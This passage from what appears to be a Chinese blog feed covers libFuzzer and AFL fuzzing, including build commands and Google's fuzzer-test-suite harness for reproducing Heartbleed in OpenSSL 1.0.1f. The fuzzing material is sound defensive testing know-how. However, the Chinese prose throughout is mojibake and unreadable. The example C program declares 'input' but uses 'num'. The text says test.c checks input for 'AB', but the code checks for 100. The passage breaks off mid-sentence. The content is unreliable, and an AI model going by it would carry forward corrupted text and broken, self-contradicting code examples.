title="å­—å…¸æ”¯æŒ"></a>å­—å…¸æ”¯æŒ</h2><ul><li>å­—å…¸æ„æˆ</li></ul><p>å­—å…¸æ¯ä¸€è¡Œéƒ½æ˜¯ä¸€ä¸ªå¯è¢«æ’å…¥ã€æ›¿æ¢æˆ–æ‹¼æ¥åˆ°è¾“å…¥ä¸­çš„å­—ç¬¦ä¸²æˆ–å­—èŠ‚ç‰‡æ®µã€‚åœ¨ Fuzz è¿‡ç¨‹ä¸­</p><p>ç”¨åŒå¼•å·åŒ…è£¹ï¼Œç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dict">&quot;GET&quot;<br>&quot;POST&quot;<br>&quot;Content-Type:&quot;<br>&quot;username=&quot;<br>&quot;&#123;\&quot;key\&quot;:&quot;<br>&quot;\r\n&quot;<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨å­—å…¸</li></ul><p>é€šè¿‡<code>-dict</code>å‚æ•°æŒ‡å®šä½¿ç”¨çš„å­—å…¸ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./fuzzer corpus -dict=demo.dict<br></code></pre></td></tr></table></figure><h2 id="è‡ªåŠ¨ç”Ÿæˆfuzzer"><a href="#è‡ªåŠ¨ç”Ÿæˆfuzzer" class="headerlink" title="è‡ªåŠ¨ç”Ÿæˆfuzzer"></a>è‡ªåŠ¨ç”Ÿæˆfuzzer</h2><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>å¤ç°è‘—åçš„å¿ƒè„æ»´è¡€æ¼æ´ã€‚</p><p>openssl-1.0.1f - Heartbleed</p><h3 id="ç¼–è¯‘é¡¹ç›®"><a href="#ç¼–è¯‘é¡¹ç›®" class="headerlink" title="ç¼–è¯‘é¡¹ç›®"></a>ç¼–è¯‘é¡¹ç›®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/google/fuzzer-test-suite.git<br>./openssl-1.0.1f/build.sh<br>tar xzf openssl1.0.1f.tgz<br>cd openssl1.0.1f/<br><br>./config<br>make clean<br>make CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address,fuzzer-no-link -fsanitize-coverage=trace-cmp,trace-gep,trace-div&quot; -j$(nproc)<br></code></pre></td></tr></table></figure><h3 id="ç¼–å†™fuzzer"><a href="#ç¼–å†™fuzzer" class="headerlink" title="ç¼–å†™fuzzer"></a>ç¼–å†™fuzzer</h3><ul><li>fuzzer</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Copyright 2016 Google Inc. All Rights Reserved.</span><br><span class="hljs-comment">// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/ssl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CERT_PATH</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> CERT_PATH</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>SSL_CTX *<span class="hljs-title function_">Init</span><span class="hljs-params">()</span> &#123;<br>  SSL_library_init();<br>  SSL_load_error_strings();<br>  ERR_load_BIO_strings();<br>  OpenSSL_add_all_algorithms();<br>  SSL_CTX *sctx;<br>  assert (sctx = SSL_CTX_new(TLSv1_method()));<br>  <span class="hljs-comment">/* These two file were created with this command:</span><br><span class="hljs-comment">      openssl req -x509 -newkey rsa:512 -keyout server.key \</span><br><span class="hljs-comment">     -out server.pem -days 9999 -nodes -subj /CN=a/</span><br><span class="hljs-comment">  */</span><br>  assert(SSL_CTX_use_certificate_file(sctx, CERT_PATH <span class="hljs-string">&quot;server.pem&quot;</span>,<br>                                      SSL_FILETYPE_PEM));<br>  assert(SSL_CTX_use_PrivateKey_file(sctx, CERT_PATH <span class="hljs-string">&quot;server.key&quot;</span>,<br>                                     SSL_FILETYPE_PEM));<br>  <span class="hljs-keyword">return</span> sctx;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> <span class="hljs-title function_">LLVMFuzzerTestOneInput</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">size_t</span> Size)</span> &#123;<br>  <span class="hljs-type">static</span> SSL_CTX *sctx = Init();<br>  SSL *server = SSL_new(sctx);<br>  BIO *sinbio = BIO_new(BIO_s_mem());<br>  BIO *soutbio = BIO_new(BIO_s_mem());<br>  SSL_set_bio(server, sinbio, soutbio);<br>  SSL_set_accept_state(server);<br>  BIO_write(sinbio, Data, Size);<br>  SSL_do_handshake(server);<br>  SSL_free(server);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ„å»ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address,fuzzer \<br>    -fsanitize-coverage=trace-cmp,trace-gep,trace-div \<br>    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \<br>    -o openssl_fuzzer<br></code></pre></td></tr></table></figure><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir corpus1 <br>./openssl_fuzzer ./corpus1<br></code></pre></td></tr></table></figure><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2><p>libFuzzer å¯ä»¥å’Œ AFL è”åˆåŠ å¿« Fuzz æ•ˆç‡ã€‚æ¯”å¦‚å…ˆç”¨ AFL è¿›è¡Œåˆæ­¥çš„ Fuzz æµ‹è¯•ï¼Œä½¿ç”¨ AFL ç”Ÿæˆçš„æ ·æœ¬è¿›è¡Œ libFuzzer æµ‹è¯•ã€‚å¯¹ç›®æ ‡å‡½æ•°è¿›è¡Œä¸“æ³¨æ€§çš„æ¨¡ç³Šæµ‹è¯•ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p><a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer å®˜æ–¹æ–‡æ¡£</a><br><a href="https://bbs.kanxue.com/thread-283781.htm#msg_header_h1_0">[åŸåˆ›]libFuzzeræ¨¡ç³Šæµ‹è¯•å¼•æ“è°ƒç ”ä¸è‡ªå®šä¹‰å¼€å‘</a><br><a href="https://www.secpulse.com/archives/71898.html">fuzzå®æˆ˜ä¹‹libfuzzer - SecPulse.COM | å®‰å…¨è„‰æ</a><br><a href="https://www.freebuf.com/articles/system/395965.html">libFuzzeræ¼æ´æŒ–æ˜æ€»ç»“æ•™ç¨‹ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFLæ¨¡ç³Šæµ‹è¯•å…¥é—¨</title>
      <link href="/2025/07/01/fuzz/afl/"/>
      <url>/2025/07/01/fuzz/afl/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç© Fuzz ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä¹Ÿæ˜¯æƒ³é€šè¿‡æœ¬æ–‡å¯¹ Fuzz çš„åŸç†æ€æƒ³å’Œ AFL çš„å·¥å…·çš„ä½¿ç”¨åšä¸€ä¸ªæ€»ç»“ã€‚ä¹Ÿæ˜¯å¯¹è¿™äº›å†…å®¹åšä¸€ä¸ªæ•´ç†å§ã€‚å¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°åæ¥è€…ã€‚</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><h3 id="æ¨¡ç³Šæµ‹è¯•"><a href="#æ¨¡ç³Šæµ‹è¯•" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•"></a>æ¨¡ç³Šæµ‹è¯•</h3><p>æ•´ä¸ª fuzzing æµç¨‹å¤§è‡´å¯ä»¥æ‹†åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ï¼š1. seed selectionã€2. mutationã€3. coverageã€‚</p><p>æ¨¡ç³Šæµ‹è¯•çš„å®šä¹‰ï¼šä¸€ç§é€šè¿‡æä¾›éé¢„æœŸçš„è¾“å…¥å¹¶ç›‘è§†å¼‚å¸¸ç»“æœæ¥å‘ç°è½¯ä»¶æ•…éšœçš„æ–¹æ³•ã€‚</p><p>æ¨¡ç³Šæµ‹è¯•åˆç§° fuzzingï¼Œæ˜¯ä¸€ç§<strong>è½¯ä»¶æµ‹è¯•</strong>æŠ€æœ¯ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µæ˜¯<strong>è‡ªåŠ¨ç”Ÿæˆéšæœºè¾“å…¥</strong>åˆ°ç¨‹åºä¸­ï¼Œå¹¶ç›‘æ§ç¨‹åºå¼‚å¸¸ï¼ˆå¦‚å´©æºƒã€æ–­è¨€å¤±è´¥ç­‰ï¼‰ï¼Œä»¥å‘ç°å¯èƒ½çš„ç¨‹åºé”™è¯¯ã€‚</p><p>æ¨¡ç³Šæµ‹è¯•ä¸€èˆ¬æ˜¯ä¸€ä¸ªè‡ªåŠ¨æˆ–åŠè‡ªåŠ¨çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹åŒ…æ‹¬åå¤æ“çºµç›®æ ‡è½¯ä»¶å¹¶ä¸ºå…¶æä¾›å¤„ç†æ•°æ®ã€‚</p><p>æ‰€æœ‰çš„æ¨¡ç³Šå™¨éƒ½å¯åˆ†ä¸ºä¸¤å¤§ç±»ï¼šåŸºäºå˜å¼‚çš„æ¨¡ç³Šå™¨ï¼Œè¿™ç§æ¨¡ç³Šå™¨å¯¹å·²æœ‰æ•°æ®æ ·æœ¬åº”ç”¨å˜å¼‚æŠ€æœ¯ä»¥åˆ›å»ºæµ‹è¯•ç”¨ä¾‹ã€‚</p><p>åŸºäºç”Ÿæˆçš„æ¨¡ç³Šå™¨ï¼Œè¿™ç§æ¨¡ç³Šå™¨é€šè¿‡å¯¹ç›®æ ‡åè®®æˆ–æ–‡ä»¶æ ¼å¼å»ºæ¨¡çš„æ–¹æ³•ä»å¤´å¼€å§‹äº§ç”Ÿæµ‹è¯•ç”¨ä¾‹ã€‚</p><p>æ¨¡ç³Šæµ‹è¯•ï¼ˆæˆ–æ¨¡ç³Šæµ‹è¯•ï¼‰æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–è½¯ä»¶æµ‹è¯•æŠ€æœ¯ï¼Œå®ƒåŸºäºå‘ç¨‹åºæä¾›éšæœº&#x2F;çªå˜çš„è¾“å…¥å€¼å¹¶ç›‘æ§å…¶å¼‚å¸¸&#x2F;å´©æºƒã€‚</p><p>è¦†ç›–ç‡å¼•å¯¼çš„è¿›åŒ–æ¨¡ç³Šæµ‹è¯•ï¼š</p><ul><li><p><strong>Evolutionary</strong>: æ˜¯ä¸€ç§å—è¿›åŒ–ç®—æ³•å¯å‘çš„å…ƒå¯å‘å¼æ–¹æ³•ï¼Œå®ƒåŸºæœ¬ä¸ŠåŒ…æ‹¬é€šè¿‡ä½¿ç”¨é€‰æ‹©æ ‡å‡†ï¼ˆä¾‹å¦‚è¦†ç›–ç‡ï¼‰æ¥éšæ—¶é—´æ¨ç§»åˆå§‹å­é›†ï¼ˆç§å­ï¼‰çš„è¿›åŒ–å’Œçªå˜ã€‚</p></li><li><p><strong>Coverage-guided</strong>: ä¸ºäº†å¢åŠ å‘ç°æ–°å´©æºƒçš„å‡ ç‡ï¼Œè¦†ç›–ç‡å¼•å¯¼å¼æ¨¡ç³Šæµ‹è¯•ç¨‹åºæ”¶é›†å¹¶æ¯”è¾ƒä¸åŒè¾“å…¥ä¹‹é—´çš„ä»£ç è¦†ç›–ç‡æ•°æ®ï¼ˆé€šå¸¸é€šè¿‡æ’æ¡©ï¼‰ï¼Œå¹¶é€‰æ‹©é‚£äº›å¯¼è‡´æ–°æ‰§è¡Œè·¯å¾„çš„è¾“å…¥ã€‚</p></li></ul><p>æ ¸å¿ƒåŸç†</p><ul><li><strong>å¼‚å¸¸è¾“å…¥æµ‹è¯•</strong>ï¼šå‘ç¨‹åºæä¾›éé¢„æœŸè¾“å…¥ä»¥å‘ç°æ¼æ´</li><li><strong>è‡ªåŠ¨åŒ–å˜å¼‚</strong>ï¼šå¯¹æœ‰æ•ˆè¾“å…¥è¿›è¡Œéšæœºä¿®æ”¹ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹</li><li><strong>è¦†ç›–ç‡å¼•å¯¼</strong>ï¼šé€šè¿‡ä»£ç è¦†ç›–ç‡ä¼˜åŒ–æµ‹è¯•æ•ˆç‡(ç°ç›’æµ‹è¯•)</li></ul><p>ä¸»è¦ç±»å‹</p><table><thead><tr><th>ç±»å‹</th><th>ç‰¹ç‚¹</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>ç™½ç›’æµ‹è¯•</strong></td><td>éœ€è¦æºç ï¼Œæ·±åº¦åˆ†æå†…éƒ¨ç»“æ„</td><td>æºç å¯ç”¨æ—¶çš„æ·±åº¦æµ‹è¯•</td></tr><tr><td><strong>é»‘ç›’æµ‹è¯•</strong></td><td>æ— éœ€æºç ï¼Œå¤–éƒ¨è¾“å…¥æµ‹è¯•</td><td>é—­æºè½¯ä»¶æµ‹è¯•</td></tr><tr><td><strong>ç°ç›’æµ‹è¯•</strong></td><td>è½»é‡çº§æ’æ¡©ï¼Œå…¼é¡¾æ•ˆç‡ä¸æ·±åº¦</td><td>å¤§å¤šæ•°ç°ä»£Fuzzeré‡‡ç”¨</td></tr><tr><td>æ¨¡ç³Šæµ‹è¯•ï¼ˆFuzzingï¼‰æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„ã€ç”¨äºå‘ç°è½¯ä»¶ç¼ºé™·æˆ–æ¼æ´çš„æµ‹è¯•æŠ€æœ¯ï¼Œä¸»è¦é€šè¿‡å‘ç¨‹åºè¾“å…¥éšæœºæˆ–ä¸åˆæ³•çš„æ•°æ®æ¥æµ‹è¯•å…¶å¥å£®æ€§ã€‚æ¨¡ç³Šæµ‹è¯•çš„æ ¸å¿ƒç›®æ ‡æ˜¯é€šè¿‡ä¸åˆç†æˆ–æ„å¤–çš„è¾“å…¥è§¦å‘ç¨‹åºä¸­çš„å¼‚å¸¸è¡Œä¸ºã€å´©æºƒæˆ–å®‰å…¨æ¼æ´ã€‚</td><td></td><td></td></tr></tbody></table><ul><li>ç§å­ï¼šåˆå§‹è¾“å…¥æ ·æœ¬</li><li>å˜å¼‚ï¼šé€šè¿‡ä¿®æ”¹ç§å­ç”Ÿæˆæ–°è¾“å…¥</li><li>è¦†ç›–ç‡ï¼šè¡¡é‡æµ‹è¯•è¦†ç›–ä»£ç è·¯å¾„çš„æŒ‡æ ‡</li><li>å´©æºƒï¼ˆcrashï¼‰ï¼šç¨‹åºå› å¼‚å¸¸è¾“å…¥å¯¼è‡´çš„é”™è¯¯</li></ul><p>ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥è®²è§£ä»€ä¹ˆæ˜¯æ¨¡ç³Šæµ‹è¯•ã€‚å¦‚ä¸‹æˆ‘ä»¬æœ‰ä¸€æ®µç®€å•çš„ä»£ç ï¼Œä»£ç æ¥æ”¶ä¸€ä¸ªæ•°å­—çš„è¾“å…¥ï¼Œå®ƒæœ‰ä¸€ä¸ª Bug ä¼šåœ¨è¾“å…¥æ•°å­— 100 æ—¶è§¦å‘ï¼Œä½†æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ªç¨‹åºå­˜åœ¨è¿™ä¸ª Bugã€‚æˆ‘ä»¬å¯ä»¥ä»è¾“å…¥æ•°å­— 1 å¼€å§‹ä¸æ–­çš„å°è¯•ï¼Œé€æ¬¡é€’å¢è¾“å…¥æ•°å­—ï¼Œæœ€ç»ˆå‘ç°åœ¨æ•°å­—é€’å¢åˆ° 100 æ—¶ç¨‹åºå´©æºƒé€€å‡ºã€‚</p><p>ä»¥ä¸Šæˆ‘ä»¬ä¸æ–­è¾“å…¥å°è¯•çš„è¡Œä¸ºå°±æ˜¯æ¨¡ç³Šæµ‹è¯•ã€‚æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­— 1 å°±æ˜¯æ¨¡ç³Šæµ‹è¯•çš„ç§å­ï¼Œé€æ¬¡é€’å¢æ•°å­—å°±æ˜¯æˆ‘ä»¬æ¨¡ç³Šæµ‹è¯•çš„å˜å¼‚ç­–ç•¥ï¼Œæœ€åæˆ‘ä»¬å‘ç°è¿™ä¸ª Bug åè®°å½•ä¸‹åé¦ˆæ¥åˆ†æ Bug äº§ç”Ÿçš„åŸå› ã€‚</p><p>ä¸¾ä¸ªç®€å•ä¾‹å­ï¼Œæ–‡ä»¶<strong>test.c</strong>æ˜¯å¾…æµ‹è¯•ç¨‹åºçš„æºä»£ç ï¼Œè¯¥ç¨‹åºä»stdinè¯»å–8å­—èŠ‚åè¾“å‡ºï¼Œä½†åœ¨è¾“å‡ºå‰ä¼šæ¯”è¾ƒè¾“å…¥(<code>input</code>) (1)çš„å‰ä¸¤ä¸ªå­—èŠ‚æ˜¯å¦ä¸º<code>AB</code>ï¼Œå¦‚æœæ˜¯å°±ä¼šæ‰§è¡Œæœ‰é—®é¢˜çš„ä»£ç (2)ï¼Œå¹¶è§¦å‘æ®µé”™è¯¯å¯¼è‡´ç¨‹åºç»ˆæ­¢ã€‚è¿™é‡Œ(1)å¯¹åº”çœŸå®ç¨‹åºä¸­çš„æŸäº›æ‰§è¡Œæ¡ä»¶ï¼Œ(2)å¯¹åº”å­˜åœ¨é—®é¢˜çš„ä»£ç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> input;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>    <span class="hljs-keyword">if</span> (num == <span class="hljs-number">100</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Critical error triggered!\n&quot;</span>);<br>        <span class="hljs-built_in">abort</span>();  <span class="hljs-comment">// ç¨‹åºå´©æºƒ</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Processing %d: OK\n&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ fuzz ç›®æ ‡å¾€å¾€æœ‰æ•°ä¸‡è¡Œä¹ƒè‡³ç™¾ä¸‡è¡Œä»£ç ï¼Œé€è¡Œæ£€æŸ¥æ•ˆç‡å¤ªä½ï¼Œè‡ªåŠ¨åŒ–æ‰æ˜¯ç‹é“ã€‚æ­¤å‡ºç°äº†æ¨¡ç³Šæµ‹è¯•ã€‚æ¨¡ç³Šæµ‹è¯•è‡ªåŠ¨å®Œæˆï¼š1. æ‰§è¡Œç›®æ ‡ç¨‹åºã€2. è¾“å…¥æµ‹è¯•æ•°æ®ã€3. æŠ¥å‘Šæ‰§è¡Œç»“æœï¼Œæ‰§è¡Œè¿™äº›æ“ä½œçš„ç¨‹åºç§°ä¸ºfuzzerï¼Œæ ¹æ®å¼€å‘å’Œæ‰§è¡Œæ•ˆç‡éœ€æ±‚ï¼Œä¼šé€‰æ‹©ä¸åŒè¯­è¨€å®ç°ã€‚</p><p>fuzzer.pyï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess  <br>â€‹  <br>target = <span class="hljs-string">&#x27;./test&#x27;</span>  <br>inps = [<span class="hljs-string">&#x27;AA&#x27;</span>, <span class="hljs-string">&#x27;BB&#x27;</span>, <span class="hljs-string">&#x27;BA&#x27;</span>, <span class="hljs-string">&#x27;AB&#x27;</span>]  <br>â€‹  <br><span class="hljs-keyword">for</span> inp <span class="hljs-keyword">in</span> inps:  <br> Â  Â <span class="hljs-keyword">try</span>:  <br> Â  Â  Â  Â subprocess.run([target], <span class="hljs-built_in">input</span>=inp.encode(), capture_output=<span class="hljs-literal">True</span>, check=<span class="hljs-literal">True</span>)  <br> Â  Â <span class="hljs-keyword">except</span> subprocess.CalledProcessError: <span class="hljs-comment"># (1)  </span><br> Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;bug found with input: &#x27;<span class="hljs-subst">&#123;inp&#125;</span>&#x27;&quot;</span>)  <br>â€‹  <br><span class="hljs-comment"># (è¾“å‡º)  </span><br><span class="hljs-comment"># bug found with input: &#x27;AB&#x27;</span><br></code></pre></td></tr></table></figure><p>åœ¨æ¨¡ç³Šæµ‹è¯•å‡ºç°å‰ï¼Œä¸ºäº†éªŒè¯<strong>ç¨‹åºåŠŸèƒ½</strong>æ˜¯å¦æ­£å¸¸ï¼Œä¼šç¼–å†™æµ‹è¯•è„šæœ¬æˆ–<strong>å•å…ƒæµ‹è¯•</strong>ï¼Œè¿™ä¸æ¨¡ç³Šæµ‹è¯•çš„æ–¹å‘ä¸åŒï¼šå‰è€…å¯»æ‰¾ç¨‹åºå¼‚å¸¸ï¼Œåè€…ä»…éªŒè¯ç¨‹åºåŠŸèƒ½æ˜¯å¦æŒ‰é¢„æœŸæ‰§è¡Œã€‚</p><p>è¿™ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆæ¨¡ç³Šæµ‹è¯•è¢«å½’ç±»åœ¨å®‰å…¨é¢†åŸŸã€‚æ­£å¸¸æƒ…å†µä¸‹ç”¨æˆ·ä¼šæŒ‰ç…§<strong>é¢„æœŸæ–¹å¼</strong>ä½¿ç”¨æœåŠ¡ï¼Œå› æ­¤é€šè¿‡å•å…ƒæµ‹è¯•å°±ä»£è¡¨æœåŠ¡èƒ½æ­£å¸¸è¿è¡Œã€‚ä½†å¹¶éæ‰€æœ‰ç”¨æˆ·éƒ½ä¼šè§„èŒƒæ“ä½œï¼Œå¦‚æœç¨‹åºæœªå¯¹è¿™äº›éé¢„æœŸæ“ä½œè¿›è¡Œæ£€æŸ¥ï¼Œå°±å¯èƒ½å­˜åœ¨æ¼æ´ï¼Œè½»åˆ™å¯¼è‡´æœåŠ¡ç»ˆæ­¢ï¼Œé‡åˆ™è®©æ”»å‡»è€…è·å¾—ä¸»æœºæ§åˆ¶æƒã€‚æ¨¡ç³Šæµ‹è¯•çš„æ¦‚å¿µæ°å¥½ç¬¦åˆæ”»å‡»è€…è§†è§’ï¼šæ‰§è¡Œç¨‹åºå¹¶è¾“å…¥éšæœºç”Ÿæˆçš„æ•°æ®ï¼Œé€šè¿‡æ‰§è¡Œç»“æœæ£€æŸ¥å½“å‰è¾“å…¥æ˜¯å¦æ»¡è¶³è§¦å‘æ¼æ´çš„æ¡ä»¶ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼Œæ¨¡ç³Šæµ‹è¯•ç”¨äºå‘ç°ç¨‹åºæ¼æ´ï¼Œå¸®åŠ©å¼€å‘è€…åŠæ—¶ä¿®å¤ï¼Œé¿å…è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚</p><p>ç±»å‹</p><ul><li>åŸºäºç”Ÿæˆï¼šæ ¹æ®ç›®æ ‡æ ¼å¼è§„èŒƒç”Ÿæˆè¾“å…¥</li><li>åŸºäºå˜å¼‚ï¼šå¯¹ç°æœ‰è¾“å…¥æ ·æœ¬è¿›è¡Œéšæœºä¿®æ”¹</li><li>ç°ç›’&#x2F;ç™½ç›’æ¨¡ç³Šæµ‹è¯•ï¼šç»“åˆä»£ç è¦†ç›–ç‡åé¦ˆ</li></ul><p><img src="/Linux/assets/Pasted%20image%2020250312224245.png"></p><p>ç°ç›’æ¨¡ç³Šæµ‹è¯•çš„å·¥ä½œæµç¨‹</p><p><img src="/Linux/assets/Pasted%20image%2020250326185550.png"></p><p>AFL å·¥ä½œæµç¨‹</p><p><img src="/Linux/assets/Pasted%20image%2020250326185758.png"></p><p>AFL çš„åŸºäºä¸€ä¸ªç†è®ºï¼šæ‰§è¡Œè¦†ç›–çš„ä»£ç è¶Šå¤šï¼Œè¶Šæœ‰å¯èƒ½è§¦å‘å¼‚å¸¸ï¼Œè¿™é‡Œé‡‡ç”¨è¾¹è¦†ç›–ç‡ä»£è¡¨è¦†ç›–ä»£ç çš„å¤šå¯¡</p><p>é«˜çº§ä¸»é¢˜ï¼š</p><ul><li>è¦†ç›–ç‡ä¼˜åŒ–ï¼šå­¦ä¹ å¦‚ä½•åˆ©ç”¨ä»£ç è¦†ç›–ç‡åé¦ˆæå‡æ•ˆç‡</li><li>ç¬¦å·æ‰§è¡Œï¼šç»“åˆæ¨¡ç³Šæµ‹è¯•ä¸ç¬¦å·æ‰§è¡Œ</li><li>è¯­æ–™åº“ç®¡ç†ï¼šä¼˜åŒ–ç§å­åº“ï¼Œæå‡å˜å¼‚ç­–ç•¥</li><li>æ¼æ´åˆ†æï¼šä½¿ç”¨è°ƒè¯•å·¥å…·åˆ†æå´©æºƒåŸå› </li></ul><h3 id="æ¨¡ç³Šæµ‹è¯•åˆ†ç±»"><a href="#æ¨¡ç³Šæµ‹è¯•åˆ†ç±»" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•åˆ†ç±»"></a>æ¨¡ç³Šæµ‹è¯•åˆ†ç±»</h3><p>é»‘ç›’ã€ç°ç›’ã€ç™½ç›’ fuzzing</p><h3 id="åŸºæœ¬å—"><a href="#åŸºæœ¬å—" class="headerlink" title="åŸºæœ¬å—"></a>åŸºæœ¬å—</h3><p>åŸºæœ¬å—ï¼ˆbasic blockï¼‰ï¼Œæ˜¯æˆ‘ä»¬åœ¨ç¼–ç¨‹æ—¶ç¨‹åºåœ¨æ‰§è¡Œæ—¶ä¼šå› 